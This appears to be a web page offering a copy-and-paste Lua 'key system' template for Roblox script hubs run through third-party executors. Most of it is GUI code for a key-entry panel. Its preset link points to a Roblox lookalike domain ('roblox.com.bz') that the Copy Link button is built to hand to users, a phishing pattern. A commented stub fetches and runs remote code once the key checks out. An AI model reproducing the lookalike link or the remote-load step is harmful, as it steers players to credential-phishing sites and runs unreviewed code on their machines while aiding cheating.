GUI Preview

KeySystem v1.0
ROBLOX
Script Hub
Enter your key to unlock access
License Key
XXXX-XXXX-XXXX-XXXX
Check Key
Copy Link
Waiting for key...
KeySystem.lua
SOURCE
Lua Script — copy & paste into your executor
-- KeySystem.lua | Change VALID_KEY and LINK_URL below

local VALID_KEY = "MYHUB-2024-ULTRA-PASS"  -- ← change your key here
local LINK_URL  = "https://roblox.com.bz/communities/4435845051/" -- ← change link here

-- GUI setup (ScreenGui → Frame)
local Players    = game:GetService("Players")
local player     = Players.LocalPlayer
local gui        = Instance.new("ScreenGui", player.PlayerGui)
local frame      = Instance.new("Frame", gui)
local keyBox     = Instance.new("TextBox", frame)
local checkBtn   = Instance.new("TextButton", frame)
local copyBtn    = Instance.new("TextButton", frame)
local statusLbl  = Instance.new("TextLabel", frame)

-- Frame styling
gui.ResetOnSpawn    = false
frame.Size          = UDim2.new(0, 360, 0, 180)
frame.Position      = UDim2.new(0.5, -180, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(16, 19, 30)
frame.BorderSizePixel = 0

-- TextBox (key input)
keyBox.PlaceholderText = "Enter your key…"
keyBox.Size           = UDim2.new(1, -32, 0, 36)
keyBox.Position       = UDim2.new(0, 16, 0, 50)
keyBox.BackgroundColor3 = Color3.fromRGB(10, 12, 20)
keyBox.TextColor3     = Color3.fromRGB(232, 234, 246)
keyBox.Font           = Enum.Font.Code
keyBox.TextSize       = 13
keyBox.BorderSizePixel = 0

-- Check Key button (left)
checkBtn.Text     = "Check Key"
checkBtn.Size     = UDim2.new(0.48, 0, 0, 36)
checkBtn.Position = UDim2.new(0, 16, 0, 100)
checkBtn.BackgroundColor3 = Color3.fromRGB(124, 106, 247)
checkBtn.TextColor3       = Color3.fromRGB(255, 255, 255)
checkBtn.Font             = Enum.Font.GothamBold
checkBtn.TextSize         = 13
checkBtn.BorderSizePixel  = 0

-- Copy Link button (right)
copyBtn.Text      = "Copy Link"
copyBtn.Size      = UDim2.new(0.48, 0, 0, 36)
copyBtn.Position  = UDim2.new(0.52, -16, 0, 100)
copyBtn.BackgroundColor3 = Color3.fromRGB(22, 26, 40)
copyBtn.TextColor3       = Color3.fromRGB(167, 139, 250)
copyBtn.Font             = Enum.Font.GothamBold
copyBtn.TextSize         = 13
copyBtn.BorderSizePixel  = 0

-- Status label
statusLbl.Size      = UDim2.new(1, 0, 0, 24)
statusLbl.Position  = UDim2.new(0, 0, 0, 150)
statusLbl.Text      = "Waiting for key..."
statusLbl.TextColor3 = Color3.fromRGB(107, 113, 148)
statusLbl.BackgroundTransparency = 1
statusLbl.Font      = Enum.Font.Gotham
statusLbl.TextSize  = 12

-- Check Key logic
checkBtn.MouseButton1Click:Connect(function()
    if keyBox.Text == VALID_KEY then
        statusLbl.Text       = "✓ Key verified — loading..."
        statusLbl.TextColor3 = Color3.fromRGB(74, 222, 128)
        -- TODO: loadstring(game:HttpGet("your_script_url"))()
    else
        statusLbl.Text       = "✗ Invalid key. Get yours below."
        statusLbl.TextColor3 = Color3.fromRGB(248, 113, 113)
    end
end)

-- Copy link logic
copyBtn.MouseButton1Click:Connect(function()
    statusLbl.Text       = "Link copied! Check your clipboard."
    statusLbl.TextColor3 = Color3.fromRGB(167, 139, 250)
    -- setclipboard(LINK_URL) -- uncomment for supported executors
end)
